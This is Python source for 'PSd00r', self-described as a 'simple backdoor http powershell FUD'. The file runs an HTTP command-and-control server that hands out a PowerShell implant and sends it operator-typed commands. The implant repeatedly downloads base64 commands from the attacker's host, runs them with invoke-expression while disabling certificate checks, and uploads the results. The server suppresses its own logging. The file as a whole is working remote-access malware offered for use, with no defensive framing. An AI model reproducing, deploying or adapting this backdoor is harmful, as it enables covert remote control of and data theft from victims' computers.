#codding: utf-8

# MIT License
#
# Copyright (c) 2018 Marcos Nesster
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import base64
import argparse


code =   """
            function getUser() {{
                $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
                $string = $string.Trim()
                return $string
            }}

            function getComputerName() {{
                $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
                $string = $string.Trim()
                return $string
            }}


            $resp = "http://{SERVER}:{PORT}/rat"
            $w = New-Object Net.WebClient
	        while($true)
	        {{
	        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
	        $r_get = $w.DownloadString($resp)
            $d = [System.Convert]::FromBase64String($r_get);
            $Ds = [System.Text.Encoding]::UTF8.GetString($d);

	        while($r) {{
		        $output = invoke-expression $Ds | out-string
		        $w.UploadString($resp, $output)
		        break
	        }}
	        }}

        """


class myHandler(BaseHTTPRequestHandler):
    ''' simple backdoor http powershell command '''

    def log_message(self, format, *args):
        """ hide log output  """
        return

    def do_GET(self):
        if (self.path == "/connect"):
            self.send_response(200);
            self.send_header('Content-type',1);
            self.end_headers();
            self.wfile.write(code);

        elif "/rat" == self.path:
            self.send_response(200)
            CMD = base64.b64encode(raw_input("(PSd00r) > "))
            self.send_header('CMD',CMD) # simple test using header for send commands
            self.end_headers()
            self.wfile.write(CMD)

    def do_POST(self):
        if "/rat" == self.path:
            content_len = int(self.headers.getheader('content-length', 0))
            post_body = self.rfile.read(content_len)
            print(post_body)
            self.send_response(200)
            self.send_header('Content-type','text/plain')
            self.end_headers()


_author  = 'mh4x0f '
_version = '0.1'

def banner():
    print("""

______  _____     _ _____  _____
| ___ \/  ___|   | |  _  ||  _  |
| |_/ /\ `--.  __| | |/' || |/' |_ __
|  __/  `--. \/ _` |  /| ||  /| | '__|
| |    /\__/ / (_| \ |_/ /\ |_/ / |
\_|    \____/ \__,_|\___/  \___/|_|

simple backdoor http powershell FUD
    """)

if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser(description="PSd00r - simple backdoor http powershell FUD")
    parser.add_argument('-i','--ip-addr',  dest='ip',help='set the ip address to server',default='0.0.0.0')
    parser.add_argument('-p','--port',  dest='port',help='set the port the handler',default=8000)
    parser.add_argument('-v','--version', action='version', dest='version',version='%(prog)s v{}'.format(_version))
    parser_load = parser.parse_args()
    print('Author: {} P0cL4bs Team'.format(_author))
    print('Version: {} dev\n'.format(_version))
    print('[*] Starting the server...')
    print('[*] HOST: {}:{}'.format(parser_load.ip,parser_load.port))
    try:
        server = HTTPServer((parser_load.ip, parser_load.port), myHandler)
        d = dict()
        d['SERVER'] = parser_load.ip
        d['PORT'] = parser_load.port
        code = code.format(**d)
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down the web server'
        server.socket.close()
